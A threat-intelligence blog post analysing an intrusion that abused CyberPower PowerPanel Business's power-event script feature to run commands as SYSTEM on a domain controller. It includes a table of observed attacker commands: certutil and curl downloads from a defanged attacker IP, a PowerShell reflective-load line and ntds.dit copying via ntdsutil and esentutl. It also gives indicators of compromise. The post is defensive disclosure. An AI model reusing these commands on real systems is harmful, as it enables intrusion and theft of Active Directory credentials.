---
title: "Behind the Power Outage: Unmasking a New Intrusion Vector in Enterprise Infrastructure Tools"
author: Yuvaraj Megavarnadu Senior Threat Analysis Engineer
url: https://www.security.com/threat-intelligence/power-management-software-attack-vector
hostname: security.com
description: A UPS management feature that runs a script when the power fails gives an intruder a trusted, built-in way to execute code on a domain controller, dump Active Directory secrets and launch a persistent implant.
sitename: SECURITY.COM
date: "2026-11-18"
fingerprint: b5e1acc9b32727cd
---
# Behind the Power Outage: Unmasking a New Intrusion Vector in Enterprise Infrastructure Tools

## A UPS management feature that runs a script when the power fails gives an intruder a trusted, built-in way to execute code on a domain controller, dump Active Directory secrets and launch a persistent implant.

## Key findings

- Symantec's Threat Intelligence and Research Team analyzed an intrusion in which the attacker used CyberPower PowerPanel Business (PPB), a software that manages UPS devices, as their execution channel on a Windows domain controller.
- PPB can run a script (a .cmd file in an extcmd folder) when a power-related event such as a voltage sag or outage is detected. The attacker placed their own scripts in that folder through the product's web console and had the PowerPanel service, ppbed.exe, run them. The commands in this attack chain have ppbed.exe as their ancestor and run as SYSTEM.
- The PPB web service receives requests to its /local/rest/v1/file/upload endpoint on TCP port 3052.
- The attacker used this channel to download tools with certutil, then loaded a .NET assembly into memory using PowerShell, and ran ntdsutil and esentutl against the Active Directory database, ntds.dit.
- The attackers iterated the scripts, step-by-step, until the collection process worked successfully.
- The attacker then used the same channel to launch a long-running implant, upnpcont.exe, which loads a malicious atl.dll. Its process tree leads back to ppbed.exe.
- [<u>Public advisories</u>](https://zuso.ai/advisory/za-2023-02) document issues including hard-coded credentials, a default administrator password, and a file-upload path-traversal flaw in PPB. Any of these, or stolen administrator credentials, could give an attacker the necessary console access to carry out the attack described in this blog.

Attackers have long favored using legitimate tools to help them carry out malicious activities on compromised systems. Using such tools allows them to hide in plain sight by making their activities appear to originate from legitimate and trusted sources. This reduces the risk of detection when trying to deploy additional components, which may result in files getting blocked during installation and raising alarms. Common tools such as backup solutions like Veeam, and remote monitoring management (RMM) tools such as AnyDesk and ScreenConnect are frequently abused by attackers to enable remote command execution and control during breaches. While these tools dominate the headlines, new tools that can be abused are constantly found by attackers to offer the functionality they require.

The latest example is CyberPower’s [<u>PowerPanel Business</u>](https://www.cyberpowersystems.com/products/software/power-panel-business-software/power-panel-business/) edition, an application for managing CyberPower’s line of UPS devices, aimed at the small-to-medium businesses (SMBs) segment. It is used to manage critical systems that require a graceful shutdown in the event of a power fault.


## Why CyberPower PowerPanel Business is an attractive target

PPB is usually installed on critical machines that must be shut down cleanly, even during a power failure. These include machines running hypervisors, database servers, file servers, and, in this case, domain controllers (DCs). These also happen to be the systems that an intruder most wants to control.

Machines running PPB typically share three properties that make them useful to an attacker:

1. **Built-in command execution.** The vendor's documentation describes an event-action setting in which an administrator selects a command file, saved with a .cmd extension in the extcmd folder of the installation directory. When the event fires, the service runs the provided script. Scripts can be provided with data through variables such as %EVENT% and %MODULE\_NO%.
2. **A network-facing management interface.** The web management console is served by an embedded Tomcat server on TCP port 3052 and has a REST API. Uploaded files pass through Tomcat's work directory under the product's web-server\work\tomcat\localhost\local folder.
3. **A privileged, trusted service.** The service, ppbed.exe starts under services.exe and runs as S-1-5-18 (SYSTEM). Commands launched through it inherit that identity.

For an attacker to abuse PPB for malicious purposes, no complicated memory-corruption exploit, and no new service or scheduled task is necessary. In process telemetry, the activity looks like a power-management product launching cmd.exe, which defenders may dismiss as a standard power-related recovery process without further investigation.


## How the attacker abused PPB

PPB was abused by the attackers to carry out a wide range of activities. In this case, their attack involved a five-stage attack chain. We will now take a closer look at what happened under the hood.

### Stage 1: Push scripts through the file-upload endpoint

In the attack seen by Symantec researchers, the domain controller's PPB web service on TCP port 3052 received requests to its file-upload endpoint at http://\[HOST\]:3052/local/rest/v1/file/upload, which accepts a file.

Two subsequent artifacts show where the uploaded files land:

- A Tomcat upload temp file named upload\_\[RANDOM\].tmp (SHA-256 1949894c26e03d6f15ed7f4393a89dbd52f8acc62959d3d5e4f695d6a19c6d9c) sits in the product's web-server\work\tomcat\localhost\local directory, and a .cmd script was scanned at a path showing it passing from that temp file into extcmd.
- Each attacker script first appears on disk in …\CyberPower PowerPanel Business\temp\profile\extcmd\ and is then executed from …\extcmd\.

### Stage 2: Run the uploaded scripts as SYSTEM

Once a script is put in the extcmd directory, the PPBl service runs it with cmd /c:. Scripts in extcmd are named pp followed by five random lowercase letters (pp?????.cmd). The names blend in with the PPB’s own files in a directory listing.

## Stage 3: Use the channel as a general remote shell

As expected, the attacker did not use their access for triggering actions from power events. Instead, they just used it to run arbitrary commands. Each command below was executed by the PPB service through cmd.exe.

| **Command run by ppbed.exe → cmd.exe** | **Purpose** | 
| certutil -urlcache -f http://84\[.\]200\[.\]205\[.\]145/ NUL | Test that the DC can reach the attacker's server | 
| certutil -decode C:\Windows\Temp\dt.exe.b64 C:\Windows\Temp\dt.exe | Decode a staged binary | 
| curl.exe -v -m 25 http://84\[.\]200\[.\]205\[.\]145:55557/junk50k.bin -o C:\Windows\Temp\junk.bin | Ingress Tool Transfer | 
| certutil -hashfile C:\Windows\Temp\wupd.exe MD5 | Verify a download | 
| C:\Windows\Temp\hello.exe | Payload Execution | 
| powershell -ep bypass -c "....EntryPoint.Invoke(…)" (from ppgxrte.cmd) | Reflective load of the same assembly | 
| certutil -decode …\rs.b64 …\rs.ps1 | Stage a PowerShell script | 
| netstat -an | List connections | 
| certutil -decode …\bde\_l.b64 …\bde\_local.ps1 | Stage another PowerShell script | 

dt.exe, wupd.exe and hello.exe were each downloaded from hxxp://84\[.\]200\[.\]205\[.\]145:55556/ as dt.bin, wupd.bin and hello.bin. wupd.exe is detected as MSIL.Killav!gen1, a .NET antivirus killer. The base64 blob in the PowerShell command decodes to a 4,096-byte .NET PE, byte-identical to hello.exe (SHA-256 d8ae46604dc4eab411977764bd923af686aea117fb33304520d928f1d382ef0e), whose only function is to print a greeting. It serves as a test to show that the reflective-load path works.

### Stage 4: Collect the Active Directory database, revising the scripts until it works

The attackers were seen iteratively developing their data collection scripts on the fly. Scripts were executed, and results logged and checked, before further changes were made and executed again. Several iterations were made until the script achieved the required results.

| **Script (staged via extcmd)** | **Purpose** | 
| ppskbcx.cmd | Exports a copy of the Active Directory database (ntds.dit) using ntdsutil | 
| ppgxrte.cmd | Load an embedded .NET program into memory | 
| ppgtpui.cmd | Changes to run in the background with output sent to a log file | 
| ifm.cmd | The same ntdsutil export | 
| ifm2.cmd | The same export, plus a log file and a “done” marker file | 
| ifm3.cmd | The same export, with a timestamp, tool check, and exit code written to the log | 
| ppotuff.cmd | Saves the SYSTEM registry hive, then copies ntds.dit from a shadow copy with esentutl | 
| ifm4.cmd, ppinthw.cmd | Copy ntds.dit from a shadow copy with esentutl | 

The cycle of writing a script, uploading it, running it, checking results and then adjusting, bears the hallmarks of an interactive operation with a human at the keyboard. The pivot from ntdsutil ifm to esentutl /vss enables the attacker to copy a locked ntds.dit file via the Volume Shadow Copy service instead.

### Stage 5: Launch an implant from the same channel

After the collection scripts are finished, PowerShell was used to start C:\Windows\System32\config\systemprofile\AppData\Local\50679f292a1\upnpcont.exe. The process lineage is: ppbed.exe → cmd.exe → powershell.exe → upnpcont.exe.

The file upnpcont.exe is a name associated with a Microsoft UPnP component. It does not belong to a SYSTEM profile directory. It was observed loading atl.dll from the same directory with an unknown reputation. This pattern of using an old, trusted executable paired with an unknown DLL in a user-profile path is the typical pattern of the DLL side-loading technique.

Processes spawned by the implant keep ppbed.exe as the root of their lineage. The command, vssadmin create shadow /for=C: and the later robocopy collection task ran from this chain: vssadmin.exe ← powershell.exe ← upnpcont.exe ← powershell.exe ← cmd.exe ← ppbed.exe ← services.exe.


## Significance

In this attack, we have seen how attackers abused the legitimate documented features of a widely used and trusted application, CyberPower’s PowerPanel Business edition, to enable them to execute commands, while masquerading as the application itself. The command execution feature in its console enables admins to run scripts to handle power failures, but this feature is a double-edge sword that can be abused by attackers. It simply accepts a script, stores it, and runs it as SYSTEM through a signed service on a server that often sits in a privileged position.

In this case, the attacker's tooling was almost entirely reliant on built-in Windows tools (certutil, ntdsutil, esentutl, reg, vssadmin, robocopy, wmic), along with a side-loaded implant, so defenders need to check the parent process for a meaningful indicator.

What this attack shows is that UPS, power-management, and other infrastructure software should be treated like any other potentially dual-use RMM product; used with network restrictions, unique credentials, vigilant patching, and process-level monitoring.

While we have not attributed this activity to a known actor, the interactive development of a data collection script during the attack points to a threat actor with live-human presence at the keyboard. Motivations of the attackers are unclear as no exfiltration or final payload such as ransomware was seen.


## Recommendations 

- Locate all PPB console instances and restrict TCP port 3052 to named administrator hosts. Do not expose it to the internet, other servers, or user networks.
- Change the default administrator password, ensure patches are up to date
- Audit extcmd and temp\profile\extcmd paths on every PPB host and compare them with the product defaults. Treat any unknown scripts as hostile and review the console's event-to-command assignments.
- Review the techniques and indicators in this document. If you find them, assume Active Directory credentials are exposed and plan a krbtgt reset and wider credential rotation.
- Treat machines running power-management software as high-value assets and defend accordingly.


## Protection

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.


## Indicators of Compromise

### File indicators

22b8f2776f1c941d8240ee4243da537147f8d2ee4d859a68038335da7b0d7688 – ppskbcx.cmd (ntdsutil ifm)

04206431c83d1d81726e56fffb5166c0a7f138eb366e5aa918dee54af1ef22b5 – ppgtpui.cmd (ntdsutil ifm, background with log)

899f072c505e56ed65b4ea5d64ab3bc0f98c39366b2c413c988551843e729451 – ppgxrte.cmd (reflective .NET load)

76670eaadda9806c9aefa91c2ee4f2a33dcf8124574721a6ff072f19e7c03514 – pppwngl.cmd (reflective .NET load with try/catch)

839300af16b7117adf05751e1847e1e026146d388cc328a179ba799eb1c9c229 – ppotuff.cmd (reg save, esentutl /vss)

2776cfcdd46264043b823adaf37e0c85d0efd3b46d5fdbb72219535061d44b86 – ppinthw.cmd (esentutl /vss)

1949894c26e03d6f15ed7f4393a89dbd52f8acc62959d3d5e4f695d6a19c6d9c – upload\_\[RANDOM\].tmp (Tomcat upload temp file)

### AD collection scripts

cbd790d052a57d18f1cd58fe4c9887340eec5d38bfae105caf0d222f30a856d5 – ifm.cmd

c3f6aa4dc9cdbcd2cfdacd18e59e0c1af0406d59d1f81cd962ac3cde60626ee8 – ifm.cmd

b0d382443411a7986ce7eda473c3e8ed787de9083db71deb4ea0539ed74c0c25 – ifm.cmd

9abbcb4ac9a98690c666a2e843facf62af773d078db40570f08f052b0e42003f – ifm2.cmd

c2454052f49e43226f69413ce58ba0bb3a2d89e7a52f32ef8adbf0961bb838c2 – ifm3.cmd

8ee88ef957597fd4788ae9da4463dcbecec0f1969e6573204f4263f99f46b125 – ifm4.cmd

### Staged tools and loaders

3d73d5342a11dce35081e70a4ea75d39ad65bc6d480337bd33c1d2e0ba4090ee – dt.exe

12e716f48875befa978ff4a78a0b99a18b1809fc5bcc34c761158875da611aa8 – dt.exe

bdea608430fbf6384ce518a542af3e0e69a685980ef826f7db3de20d4c835e26 – wupd.exe

d8ae46604dc4eab411977764bd923af686aea117fb33304520d928f1d382ef0e – hello.exe

### Implant and side-loaded DLL

5b2285f788eec4d17bf18d85795d457f40f7598bbab2697919f5810f54a9c3fe – upnpcont.exe

d4032e61aa9ef01a5a174a90beffa5a27dd21b36e653ce5304907787554b7d95 – atl.dll
